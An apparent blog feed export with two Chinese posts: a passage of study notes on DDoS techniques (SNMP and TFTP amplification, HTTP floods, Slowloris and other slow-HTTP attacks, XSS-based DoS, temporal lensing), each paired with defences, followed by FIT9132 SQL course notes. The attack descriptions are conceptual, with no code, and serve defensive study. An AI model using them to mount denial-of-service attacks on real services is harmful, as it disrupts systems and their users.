<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" data-fancybox="group" data-caption="ddos_15" class="fancybox"><img alt="ddos_15" title="ddos_15" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" class="lazyload"></a></p>
<p><strong>防御方案</strong>：</p>
<ul>
<li>联系 <code>ISP</code> 清洗上游流量；</li>
<li>DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务；</li>
<li>对单个IP的查询速率做限制；</li>
<li>拥有足够的带宽承受小规模攻击；</li>
<li>关闭DNS服务器的递归查询；</li>
<li>利用防火墙等对 <code>ANY Request</code> 进行过滤。</li>
</ul>
<hr>
<h2 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h2><p><code>SNMP</code> ( <code>Simple Network Management Protocol</code>，简单网络管理协议)，是目前网络中应用最为广泛的网络管理协议，它提供了一个管理框架来监控和维和互联网设备，它使用UDP161端口进行通信。<font color="6495ED">攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。</font>常见的默认通信字符串如<code>public</code>、<code>private</code> 以及一些厂商默认的通信字符串。<strong>GetBulk请求</strong>是在<strong>SNMPv2</strong>中添加的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点。</p>
<h3 id="下面来看一下SNMP的PDU格式"><a href="#下面来看一下SNMP的PDU格式" class="headerlink" title="下面来看一下SNMP的PDU格式"></a>下面来看一下SNMP的PDU格式</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" data-fancybox="group" data-caption="ddos_16" class="fancybox"><img alt="ddos_16" title="ddos_16" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" class="lazyload"></a></p>
<p>攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" data-fancybox="group" data-caption="ddos_17" class="fancybox"><img alt="ddos_17" title="ddos_17" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" class="lazyload"></a></p>
<p>防护方案：</p>
<ul>
<li>禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用；</li>
<li>更改默认的通信字符串；</li>
<li>修改默认端口161；</li>
<li>隐藏开启SNMP设备的公网IP</li>
</ul>
<hr>
<h2 id="TFTP放大攻击"><a href="#TFTP放大攻击" class="headerlink" title="TFTP放大攻击"></a>TFTP放大攻击</h2><p><code>TFTP</code>（<code>Trivial File Transfer Protocol</code>，简单文件传输协议），使用<code>UDP 69端口</code>进行通信，由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文，以下是TFTP传输文件过程图</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" data-fancybox="group" data-caption="ddos_18" class="fancybox"><img alt="ddos_18" title="ddos_18" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" class="lazyload"></a></p>
<h3 id="超时重传机制"><a href="#超时重传机制" class="headerlink" title="超时重传机制"></a>超时重传机制</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" data-fancybox="group" data-caption="ddos_19" class="fancybox"><img alt="ddos_19" title="ddos_19" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" class="lazyload"></a></p>
<p>可以看到，<strong>TFTP协议</strong> 将数据分成好多个数据块进行传输，每个数据块最大为 <strong>512字节</strong>，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。若服务器没有收到客户端发来ACK报文，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。</p>
<p>攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了。</p>
<h3 id="TFTP-放大攻击示意图"><a href="#TFTP-放大攻击示意图" class="headerlink" title="TFTP 放大攻击示意图"></a>TFTP 放大攻击示意图</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" class="lazyload"></a></p>
<p><strong>防御方案</strong>：</p>
<ul>
<li>不将TFTP服务器暴露在公网上；</li>
<li>对流经TFTP服务的流量进行入侵检测；</li>
<li>将重传（数据包）率设置为1；</li>
<li>只为信任域内的主机提供服务。</li>
</ul>
<hr>
<h2 id="CC-攻击-重点"><a href="#CC-攻击-重点" class="headerlink" title="CC 攻击 (重点)"></a>CC 攻击 (重点)</h2><p><strong>CC攻击 (ChallengeCollapsar)</strong> 又称作 <code>HTTP 泛洪攻击</code>，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。</p>
<p>这种攻击方式不需要很大的带宽，且无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接，**<font color="6495ED">因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。</font>**</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" class="lazyload"></a></p>
<p><strong>防御方案</strong>：</p>
<ul>
<li>必要时将网页做成静态，减少数据库的使用；</li>
<li>限制连接数量；修改最大超时时间；</li>
<li>让用户手动输入验证码；</li>
<li>在response报文中添加特殊字段，验证IP合法性；</li>
<li>屏蔽频繁访问服务器的主机IP。</li>
</ul>
<hr>
<h2 id="HTTP-慢速攻击"><a href="#HTTP-慢速攻击" class="headerlink" title="HTTP 慢速攻击"></a>HTTP 慢速攻击</h2><p><code>Slow HTTP Dos Attacks</code>（慢速HTTP拒绝服务攻击），黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。这种攻击可以分为两类，**<font color="6495ED">一类是客户端发数据，另一类是客户端读取服务器发来的数据</font>**。HTTP慢速攻击对基于线程处理的web服务器影响显著，如 <code>apache、dhttpd</code>，而对基于事件处理的web服务器影响不大，如 <code>ngix、lighttpd。HTTP</code> 慢速攻击还可以细分成以下几种攻击方式。</p>
<h3 id="Slow-Loris-Attack"><a href="#Slow-Loris-Attack" class="headerlink" title="Slow Loris Attack"></a>Slow Loris Attack</h3><p>HTTP协议规定请求头以一个空行结束，所以 <code>完整的http请求头</code> 结尾是 <code>\r\n\r\n</code>。<br>然而使用非正常的 <code>\r\n</code> 来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。</p>
<p>两种请求头区别如下，**<font color="6495ED">CRLF</font>(Carriage Return Line Feed)** 表示回车换行</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" data-fancybox="group" data-caption="ddos_22" class="fancybox"><img alt="ddos_22" title="ddos_22" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" class="lazyload"></a></p>
<h3 id="Slow-Post-Attack"><a href="#Slow-Post-Attack" class="headerlink" title="Slow Post Attack"></a>Slow Post Attack</h3><p>在http头部信息，可以使用 <code>content-length</code> 声明HTTP消息实体的传输长度，服务器端会将 <code>content-length</code> 的值作为 <code>HTTP BODY</code> 的长度。(这个好像Struts2 有类似的漏洞)</p>
<p>利用这一特点，攻击者把 <code>content-length</code> 设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。</p>
<h3 id="Slow-Read-Attack"><a href="#Slow-Read-Attack" class="headerlink" title="Slow Read Attack"></a>Slow Read Attack</h3><p>攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。</p>
<p>由于客户端的TCP窗口很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" data-fancybox="group" data-caption="ddos_23" class="fancybox"><img alt="ddos_23" title="ddos_23" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" class="lazyload"></a></p>
<h3 id="Apache-range-header-Attack"><a href="#Apache-range-header-Attack" class="headerlink" title="Apache range header Attack"></a>Apache range header Attack</h3><p>这种攻击方式只针对 <code>Apache</code>，当客户端传输大文件时会有 <code>range字段</code>，表示将大文件分段，分成几个小段进行传输。<br>例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。</p>
<h3 id="说一下-Apache-的防护"><a href="#说一下-Apache-的防护" class="headerlink" title="说一下 Apache 的防护"></a>说一下 Apache 的防护</h3><ul>
<li><strong><font color="6495ED">mod_reqtimeout :</font></strong> 控制请求数据传输的超时时间及最小速率</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" data-fancybox="group" data-caption="ddos_24" class="fancybox"><img alt="ddos_24" title="ddos_24" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" class="lazyload"></a></p>
<ul>
<li><strong><font color="6495ED">mod_qos :</font></strong> Apache的一个服务质量控制模块，用户可配置各种不同阈值</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" data-fancybox="group" data-caption="ddos_25" class="fancybox"><img alt="ddos_25" title="ddos_25" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" class="lazyload"></a></p>
<ul>
<li><strong><font color="6495ED">mod_security :</font></strong> 一个开源的WAF模块，有专门针对慢速攻击防护的规则</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" data-fancybox="group" data-caption="ddos_26" class="fancybox"><img alt="ddos_26" title="ddos_26" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" class="lazyload"></a></p>
<p>其他的中间件防护方案，参考下面的链接</p>
<hr>
<h2 id="XSS-DOS-（稍作了解"><a href="#XSS-DOS-（稍作了解" class="headerlink" title="XSS-DOS （稍作了解"></a>XSS-DOS （稍作了解</h2><p>利用网站存在的 <code>存储型XXS漏洞</code>，在网站中插入恶意的js代码。**<font color="6495ED">代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求。</font>**</p>
<p>客户端访问已插入恶意的javascript代码的页面后，流量如下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" data-fancybox="group" data-caption="ddos_27" class="fancybox"><img alt="ddos_27" title="ddos_27" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" class="lazyload"></a></p>
<p>由于这种攻击的是由 <code>存储型XSS</code>导致的，因此要考虑如何防护 <code>存储型XSS</code>。</p>
<p><strong>防护方案</strong>：</p>
<ul>
<li>对用户的输入以及url参数进行特殊字符过滤；</li>
<li>对输出内容进行编码转换；</li>
<li>结合黑白名单机制。</li>
</ul>
<h2 id="时间透镜攻击"><a href="#时间透镜攻击" class="headerlink" title="时间透镜攻击"></a>时间透镜攻击</h2><p>通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。</p>
<p>这种攻击其实我也还弄不太懂，详细信息可以阅读这篇paper：<a href="http://icir.org/vern/papers/lensing.oak15.pdf">Temporal Lensing and its Application in Pulsing Denial-of-Service Attacks</a>，以及后面的参考链接</p>
<h3 id="攻击示意图"><a href="#攻击示意图" class="headerlink" title="攻击示意图"></a>攻击示意图</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" data-fancybox="group" data-caption="ddos_28" class="fancybox"><img alt="ddos_28" title="ddos_28" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" data-fancybox="group" data-caption="ddos_29" class="fancybox"><img alt="ddos_29" title="ddos_29" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" class="lazyload"></a></p>
<p>主要扯一下防护方案：增加抖动，干扰攻击路径，使得数据包无法预期到达；由运营商禁止源路由。<br>其他防御措施：</p>
<ul>
<li>采用高性能的网络设备；充足的网络带宽保证；升级主机服务器硬件；</li>
<li><strong>避免将服务器的真实IP暴露在公网中</strong>；</li>
<li>使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的。然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用 <code>anycast技术</code> 来防御。</li>
</ul>
<hr>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://kb.mazebolt.com/knowledgebase/ack-flood/">ack flood</a><br><a href="https://zhidao.baidu.com/question/1429836881297848579.html">DDoS和cc的区别</a><br><a href="https://www.jianshu.com/p/dff5a0d537d8">什么是cc攻击</a><br><a href="https://www.imperva.com/learn/application-security/">DDoS的大部分攻击形式</a><br><a href="https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/">Mitigate Slow HTTP GET&#x2F;POST Vulnerabilities in the Apache HTTP Server</a><br><a href="https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks">How to Protect Against Slow HTTP Attacks</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&mid=2247483685&idx=1&sn=8ac38ff22d571bbbf7716cb9e83b9b35&chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&mpshare=1&scene=23&srcid=0831Wr5YJPYzSrQU6gnfGVd0">时间透镜及其在脉冲拒绝服务攻击的应用</a><br>《破坏之王_DDoS攻击与防范深度剖析》(书籍网上有电子档)</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Monash Courses 2023S1 FIT9132</title>
    <url>/yakko117/2023/02/28/MonashCs9132/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="FIT9132-SQL"><a href="#FIT9132-SQL" class="headerlink" title="FIT9132 SQL"></a>FIT9132 SQL</h1><p> <a href="https://handbook.monash.edu/2023/units/FIT9132">学校handbook</a><br> <a href="https://docs.oracle.com/en/database/oracle/sql-developer/22.2/books.html">官方guidebook</a></p>
<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><p>安装 SQL Developer <a href="https://lms.monash.edu/pluginfile.php/15800135/mod_label/intro/OracleClientSoftwareSQLDeveloper_S1_23.pdf?time=1677133551842">install guide</a> 和VPN，开始摸鱼</p>
<p><a href="https://lms.monash.edu/pluginfile.php/15800233/mod_resource/content/37/FIT9132_AppliedSession_1-2023S1.pdf">课堂pdf指导，推荐仔细看</a></p>
<h3 id="sql-设置注意事项"><a href="#sql-设置注意事项" class="headerlink" title="sql 设置注意事项"></a>sql 设置注意事项</h3><p>在你安装的路径找到 <code>sqldeveloper.exe</code>， 右键属性，更改高DPI, 然后下面的选项勾上， 选择system or 系统<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280823439.jpg" data-fancybox="group" data-caption="属性设置" class="fancybox"><img alt="属性设置" title="属性设置" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280823439.jpg" class="lazyload"></a></p>
<p>然后是语言设置，如果是需要中文，在安装 <code>sqldeveloper</code> 的文件夹 找到 <code>ide</code> 文件，打开进入 <code>bin</code> 文件， 找到 <code>ide.conf</code> 右键用文本编辑器打开，比如leadpad notepad++ 或者是记事本， 在<code>ide.conf</code>最后加入以下代码，保存退出重新进入sql软件即可。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280845835.jpg" data-fancybox="group" data-caption="切换语言" class="fancybox"><img alt="切换语言" title="切换语言" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280845835.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">切换英文</span><br><span class="line">AddVMOption -Duser.language=en</span><br><span class="line">AddVMOption -Duser.country=AU</span><br><span class="line"></span><br><span class="line">切换中文</span><br><span class="line">AddVMOption -Duser.language=zh</span><br><span class="line">AddVMOption -Duser.country=CN</span><br></pre></td></tr></table></figure></div>
<p>然后是<strong>系统preference设置</strong><br>在 <code>工具 tools</code> 找到最下面的选项 preference 点开，找到 <code>Code Editor</code> 点开左边加号进行展开，选到 <code>Line Gutter</code>， 勾选 <code>Show Line Numbers</code>  </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846337.jpg" data-fancybox="group" data-caption="preference" class="fancybox"><img alt="preference" title="preference" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846337.jpg" class="lazyload"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846994.jpg" data-fancybox="group" data-caption="preference_1" class="fancybox"><img alt="preference_1" title="preference_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846994.jpg" class="lazyload"></a></p>
<p>然后点开下面的 <code>format</code>， 展开选择 <code>Advanced Format</code>， 找到 <code>Max char line width</code> 改成80(默认128)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846311.jpg" data-fancybox="group" data-caption="preference_2" class="fancybox"><img alt="preference_2" title="preference_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846311.jpg" class="lazyload"></a></p>
<p>后续几个照着pdf调设置就行了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281009563.jpg" data-fancybox="group" data-caption="preference_3" class="fancybox"><img alt="preference_3" title="preference_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281009563.jpg" class="lazyload"></a></p>
<h3 id="git-设置"><a href="#git-设置" class="headerlink" title="git 设置"></a>git 设置</h3><p><a href="https://git.infotech.monash.edu/">Monash Gitlab</a><br><em>(this uses Monash SAML login - Monash single sign-on)</em><br>进入网站，点击页面右上角头像栏，展开有<code>Preferences</code>，<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281016779.jpg" data-fancybox="group" data-caption="week1_git1" class="fancybox"><img alt="week1_git1" title="week1_git1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281016779.jpg" class="lazyload"></a></p>
<p>点开会跳转到新页面，找到 <code>Access Tokens</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281018568.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281018568.jpg" class="lazyload"></a></p>
<p><code>Token name</code> 随便输入，<code>Expiration date</code> 可以设置远一点，至少比本学期长一点 &#x3D; &#x3D;;<br>勾选 <code>Api</code> 选项，然后就 <code>create token</code> 就行了，<strong>记得要把生成的token保存下来，后面要用</strong><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281021025.jpg" data-fancybox="group" data-caption="Fit9132token" class="fancybox"><img alt="Fit9132token" title="Fit9132token" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281021025.jpg" class="lazyload"></a></p>
<h3 id="使用-SQL-Developer-设置local-repo"><a href="#使用-SQL-Developer-设置local-repo" class="headerlink" title="使用 SQL Developer 设置local repo"></a>使用 SQL Developer 设置local repo</h3><p>首先确保gitlab 账号和token都已经设置好了<br>在校内就直连wifi，在家就用VPN，然后在磁盘设置好一个sql工作环境，比如新建文件夹，设置文件夹名为<code>FIT9132_workspace</code>，打开<code>Sql developer</code></p>
<p>然后在学校网站找到设置需求，步骤如下<br><strong><font color="red">Moodle–&gt; FIT9132–&gt; week1–&gt; Oracle Connection Details</font></strong></p>
<p>然后进行操作建立本地数据库，点击 <strong><font color="green">绿色加号</font></strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010757431.jpg" data-fancybox="group" data-caption="创建sql" class="fancybox"><img alt="创建sql" title="创建sql" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010757431.jpg" class="lazyload"></a></p>
<p>然后按照 <code>Oracle Connection Details</code> 所给予的内容，进行填写账号密码 <strong>(PS:在校内请连校内wifi，在其他地方请连VPN)</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010758631.jpg" data-fancybox="group" data-caption="填入信息" class="fancybox"><img alt="填入信息" title="填入信息" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010758631.jpg" class="lazyload"></a></p>
<p>确认输入无误之后，点击 <code>test</code> ，连接成功会消失进程，点击 <code>Connect</code> 即可。</p>
<h3 id="修改sql密码"><a href="#修改sql密码" class="headerlink" title="修改sql密码"></a>修改sql密码</h3><p>连接好数据库后，修改密码请输入大写的 <code>PASSWORD</code>，然后点击运行即可</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010808255.jpg" data-fancybox="group" data-caption="passwd_1" class="fancybox"><img alt="passwd_1" title="passwd_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010808255.jpg" class="lazyload"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010809471.jpg" data-fancybox="group" data-caption="passwd_2" class="fancybox"><img alt="passwd_2" title="passwd_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010809471.jpg" class="lazyload"></a></p>
<h3 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h3><ul>
<li>What is data independence, and why is it lacking in file systems?</li>
</ul>
<p><strong>data independence</strong> exists when you can change the data storage characteristics without affecting the program’s ability to access the data.</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303021323674.jpg" data-fancybox="group" data-caption="w1hw" class="fancybox"><img alt="w1hw" title="w1hw" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303021323674.jpg" class="lazyload"></a></p>
<hr>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><p>照着课件进行了2个小时水水的增删改查学习，摸了<br>都是些概念东西了</p>
<h3 id="Database-design-life-cycle"><a href="#Database-design-life-cycle" class="headerlink" title="Database design life cycle"></a>Database design life cycle</h3><p><code>Requirements Definition</code> –&gt; <code>Conceptual Design</code> –&gt; <code>Logical Design</code> –&gt; <code>Physical Design</code></p>
<p><strong>Used for conceptual model (ERD)</strong><br><em>Entity-Relationship Diagram</em></p>
<h3 id="Requirements-Definition"><a href="#Requirements-Definition" class="headerlink" title="Requirements Definition"></a>Requirements Definition</h3><ul>
<li>Identify and analyse user views.</li>
<li>A ‘user view’ may be a report to be produced or a particular type of transaction that should be supported.</li>
<li>Corresponds to the external level of the ANSI&#x2F;SPARC architecture.</li>
<li>Output is a statement of specifications which describes the user views’ particular requirements and constraints.</li>
</ul>
<h3 id="Conceptual-Design"><a href="#Conceptual-Design" class="headerlink" title="Conceptual Design"></a>Conceptual Design</h3><ul>
<li>Develop the enterprise data model.</li>
<li>Independent of all physical implementation considerations (the type of database to be used).</li>
<li>In development try to <strong><font color="red">minimise redundancy within provided scenario however must not add anything outside scenario</font></strong></li>
<li>Various design methodologies may be employed such as UML, ER (Entity-Relationship) Modelling and Semantic Modelling.</li>
<li>ER consists of ENTITIES and RELATIONSHIPS between entities<ul>
<li>An ENTITY will have attributes (things we wish to record), one or more of which will identify an entity instance (called the KEY)</li>
</ul>
</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091429697.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091429697.jpg" class="lazyload"></a></p>
<h4 id="Important-rule-for-Conceptual-Modelling"><a href="#Important-rule-for-Conceptual-Modelling" class="headerlink" title="Important rule for Conceptual Modelling"></a>Important rule for Conceptual Modelling</h4><ul>
<li><p><strong>All that is described in the brief has been included and all that has been included was described in the brief</strong></p>
<ul>
<li>Every entity, attribute and relationship described in the brief <strong>has been included</strong>, and</li>
<li><strong>Must not add</strong> entities, attributes and relationships which are not included as part of the brief, and</li>
</ul>
</li>
<li><p>In a real life scenario if there are concerns about features of the brief,<br>discuss with client</p>
<ul>
<li>For assignments:<ul>
<li>your client will be the ed forum</li>
<li>may make assumptions provided they do not violate this rule</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="Logical-Design"><a href="#Logical-Design" class="headerlink" title="Logical Design"></a>Logical Design</h3><ul>
<li>Develop a data model which targets a particular database type (e.g. <strong>relational, hierarchical, network, object-oriented, noSQL</strong>).</li>
<li>Independent of any implementation details which are specific to any particular vendors DBMS package.</li>
<li>Normalisation technique is used to test the correctness of a relational logical model.</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091446462.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091446462.jpg" class="lazyload"></a></p>
<p>P: Primary Key<br>F: Foreign Key</p>
<h3 id="Physical-Design"><a href="#Physical-Design" class="headerlink" title="Physical Design"></a>Physical Design</h3><ul>
<li>Develop a strategy for the physical implementation of the logical data model.</li>
<li>Choose appropriate storage structures, indexes, file organisations and access methods which will most efficiently support the user requirements (not part of unit).</li>
<li>Physical design phase(阶段，时期) is dependent on the particular DBMS in use.</li>
</ul>
<hr>
<h3 id="Weak-vs-Strong-Entity"><a href="#Weak-vs-Strong-Entity" class="headerlink" title="Weak vs Strong Entity"></a>Weak vs Strong Entity</h3><p><strong>Strong entity</strong></p>
<ul>
<li>Has a key which may be defined without reference to other entities.</li>
<li>For example EMPLOYEE entity.</li>
</ul>
<p><strong>Weak entity</strong></p>
<ul>
<li>Has a key which requires the existence of one or more other entities.</li>
<li>For example FAMILY entity - need to include the key of employee to create a suitable key for family</li>
</ul>
<p>Database designer often determines whether an entity can be described as weak based on business rules</p>
<ul>
<li>customer pays monthly account<ul>
<li>Key: cust_no, date_paid, or</li>
<li>Invented Key: payment_no (surrogate(代替的，代理的） – not at conceptual level)</li>
</ul>
</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091516002.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091516002.jpg" class="lazyload"></a></p>
<h3 id="Types-of-Attributes"><a href="#Types-of-Attributes" class="headerlink" title="Types of Attributes"></a>Types of Attributes</h3><table>
<thead>
<tr>
<th>Simple</th>
<th>Composite</th>
</tr>
</thead>
<tbody><tr>
<td>Cannot be subdivided(细分)</td>
<td>Can be subdivided into additional attributes</td>
</tr>
<tr>
<td>Age, sex, marital(婚姻的) status</td>
<td>Address into street, city, zip</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>Single-valued</th>
<th>Multi-valued</th>
</tr>
</thead>
<tbody><tr>
<td>Can have only a single value</td>
<td>Can have many values</td>
</tr>
<tr>
<td>Person has one social security number</td>
<td>Person may have several college degrees</td>
</tr>
</tbody></table>
<hr>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Relational-Model"><a href="#Relational-Model" class="headerlink" title="Relational Model"></a>Relational Model</h3><p>Relational Model&amp;Relational Algebra关系模型与代数</p>
<h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><p>List all the super keys, candidate keys, and primary key for:</p>
<table>
<thead>
<tr>
<th>ENROLMENT</th>
<th>unitcode, stu_id, enrol_sem, enrol_year, enrol_mark, enrol_grade</th>
</tr>
</thead>
<tbody><tr>
<td>super keys</td>
<td></td>
</tr>
